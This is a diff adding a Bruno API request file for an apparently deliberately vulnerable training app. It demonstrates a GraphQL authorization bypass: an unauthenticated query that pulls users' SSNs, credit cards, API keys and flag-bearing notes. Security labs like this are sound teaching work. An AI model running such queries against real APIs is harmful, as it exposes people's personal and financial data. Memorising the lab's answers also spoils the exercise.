@@ -1,0 +1,34 @@
+meta {
+  name: G05 Authorization Bypass
+  type: http
+  seq: 5
+}
+
+post {
+  url: {{baseUrl}}/graphql
+  body: json
+  auth: none
+}
+
+body:json {
+  {
+    "query": "{ users { id username email ssn creditCard secretNote apiKey } }"
+  }
+}
+
+docs {
+  # G05: GraphQL Authorization Bypass
+
+  ## Vulnerability
+  Sensitive fields accessible without authentication.
+
+  ## Exploit
+  Query users with sensitive fields:
+  - ssn (Social Security Number)
+  - creditCard
+  - secretNote (contains flags!)
+  - apiKey
+
+  ## Flag
+  VULNAPI{graphql_authz_*}
+}
